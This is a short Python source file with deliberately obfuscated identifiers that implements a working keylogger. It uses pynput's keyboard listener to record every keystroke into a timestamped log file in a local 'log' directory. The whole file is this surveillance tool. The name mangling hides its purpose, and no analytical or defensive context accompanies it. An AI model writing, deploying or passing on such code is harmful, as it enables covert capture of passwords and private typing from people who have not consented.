lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII = Exception, staticmethod, str, __name__

from pynput.keyboard import Key as IlIIIlllIllllI, Listener as IlIIllIllllIlI
import logging as IIIIIlllIllIlI, os as IlIIllIIlIIIII
from datetime import datetime as IlIlIlIIIlIlll

class IllIIIIIIlIlIIllII:

    def llIIllIIIlIllIIIlI(llIIlIIllIllIIIllI):
        IlIIlIIlIIIIIlllIl = 'log'
        IIlIIIlllIIllllIIl = IlIIllIIlIIIII.getcwd()
        llIIlIIllIllIIIllI.log_dir = IlIIllIIlIIIII.path.join(IIlIIIlllIIllllIIl, IlIIlIIlIIIIIlllIl)
        if not IlIIllIIlIIIII.path.exists(IlIIlIIlIIIIIlllIl):
            IlIIllIIlIIIII.mkdir(IlIIlIIlIIIIIlllIl)

    @llllllllllllllI
    def IIllIlIIIlIIIlllll(lIllIlllIIIIlllIlI):
        try:
            IIIIIlllIllIlI.info(lllllllllllllIl(lIllIlllIIIIlllIlI))
        except lllllllllllllll as IlIIlIIlIIIIIlllIl:
            IIIIIlllIllIlI.info(IlIIlIIlIIIIIlllIl)

    def IlllIIIlIllIIlIlIl(IlIIlIIlIIIIIlllIl):
        llIIlIIllIllIIIllI = lllllllllllllIl(IlIlIlIIIlIlll.now())[:-7].replace(' ', '-').replace(':', '')
        IIIIIlllIllIlI.basicConfig(filename=IlIIllIIlIIIII.path.join(IlIIlIIlIIIIIlllIl.log_dir, llIIlIIllIllIIIllI) + '-log.txt', level=IIIIIlllIllIlI.DEBUG, format='[%(asctime)s]: %(message)s')
        with IlIIllIllllIlI(on_press=IlIIlIIlIIIIIlllIl.IIllIlIIIlIIIlllll) as IIlIIIlllIIllllIIl:
            IIlIIIlllIIllllIIl.join()
if lllllllllllllII == '__main__':
    IIlIlIIllIIIIllIll = IllIIIIIIlIlIIllII()
    IIlIlIIllIIIIllIll.llIIllIIIlIllIIIlI()
    IIlIlIIllIIIIllIll.IlllIIIlIllIIlIlIl()
